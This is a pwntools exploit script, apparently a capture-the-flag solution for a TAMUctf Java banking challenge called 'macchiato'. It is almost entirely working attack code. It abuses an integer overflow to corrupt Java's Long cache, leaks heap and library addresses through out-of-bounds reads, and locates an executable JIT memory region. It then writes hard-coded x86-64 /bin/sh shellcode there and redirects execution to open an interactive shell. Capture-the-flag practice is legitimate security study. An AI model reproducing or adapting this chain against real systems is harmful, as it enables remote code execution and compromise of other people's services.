from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

def start():
	if args.L:
		return remote('172.17.0.2', 9999)
	elif not args.R:
		print("local")
		return process(["java", "Challenge"], env={"JDK_JAVA_OPTIONS": "-Xmx64M"})
	else:
		print("remote")
		return remote('tamuctf.com', 443, ssl=True, sni="macchiato")

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))
_64_SHELLCODE = b"\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x31\xd2\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
	debug(r, [])

def login(bank=b'RegularBank', name=b'anotherStranger'):
	r.sendlineafter(b'option:\n', b'1')
	r.sendlineafter(b'name:\n', bank)
	r.sendlineafter(b'username:\n', name)

def examine(idx):
	r.sendlineafter(b'option:\n', b'1')
	r.sendlineafter(b'(0-10):\n', str(idx).encode())

def withdraw(idx, v):
	r.sendlineafter(b'option:\n', b'2')
	r.sendlineafter(b'(0-10):\n', str(idx).encode())
	r.sendlineafter(b'withdraw:\n', str(v).encode())


login()

# get INT_MAX
r.sendlineafter(b'option:\n', b'2')

withdraw(0, 0x7fffffffffffffff)
withdraw(0, 2)

r.sendlineafter(b'option:\n', b'3')
r.sendlineafter(b'option:\n', b'3')

# corrupt long cache
login(b'java.lang.Long$LongCache', b'cache')
r.sendlineafter(b'option:\n', b'2')

withdraw(128, 0x7fffffffffffffff)
withdraw(128, 1)
withdraw(138, 12)
withdraw(138, 0x7fffffffffffffff)
r.sendlineafter(b'option:\n', b'3')

login(b'BlazinglyFastBank', b'me')

r.sendlineafter(b'option:\n', b'2')

# get array_base address
examine(-7)
r.recvuntil(b'$')
leak = int(r.recvuntil(b'\n', True))
array_base = ((leak >> 32)  & 0xffffffff) + 0x28
dbg('array_base')

# search some library address
base = 0x00
print(f'start searching some library')
for i in range(0x40, 0x100):
	examine(base + i)
	r.recvuntil(b'$')
	leak = int(r.recvuntil(b'\n', True)) & 0xffffffffffffffff
	if leak > 0x700000000000 and leak < 0x800000000000:
		print(f'0x{i:08x}: 0x{leak:016x}')
		break

assert leak > 0x700000000000 and leak < 0x800000000000, "offset not found"
print('found')
somewherebase = leak & 0xfffffffffff00000

# search rwx pointer address
baseoff = 0x32800
print(f'start searching ptr_rwx from: 0x{somewherebase + baseoff:x}')
skip = 0
for i in range(0, 0x800):
	if skip > 0:
		skip -= 1
		continue
	examine((somewherebase + baseoff + i*8 - array_base) // 8)
	r.recvuntil(b'$')
	leak = int(r.recvuntil(b'\n', True)) & 0xffffffffffffffff
	if leak == 0x165:
		break
	elif leak != 0x4000000000000000 and leak != 0x8000000000000000:
		skip = 2

assert leak == 0x165, "offset not found"
print('found')
ptr_rwx = somewherebase + baseoff + i*8 + 0x10
dbg('ptr_rwx')

# get rwx address
examine((ptr_rwx-array_base)//8)
r.recvuntil(b'$')
rwx = int(r.recvuntil(b'\n', True)) & 0xffffffffffffffff
dbg('rwx')

# set payload to rwx
for i in range(0, len(_64_SHELLCODE), 8):
	v = u64(_64_SHELLCODE[i:i+8].ljust(8, b'\xcc'))
	if v > 0x7fffffffffffffff:
		withdraw((rwx+0xb0 + i - array_base)//8, 0x7ffffffffffffffe)
		withdraw((rwx+0xb0 + i - array_base)//8, 2)
		withdraw((rwx+0xb0 + i - array_base)//8, 0x10000000000000000-v)
	else:
		withdraw((rwx+0xb0 + i - array_base)//8, 0x7fffffffffffffff)
		withdraw((rwx+0xb0 + i - array_base)//8, 0x7fffffffffffffff)
		withdraw((rwx+0xb0 + i - array_base)//8, 3)
		withdraw((rwx+0xb0 + i - array_base)//8, 0x7fffffffffffffff-v)

# set jump code to some function
withdraw((rwx+0x80 - array_base)//8, 0xc99a)
r.sendlineafter(b'option:\n', b'gg')

r.interactive()

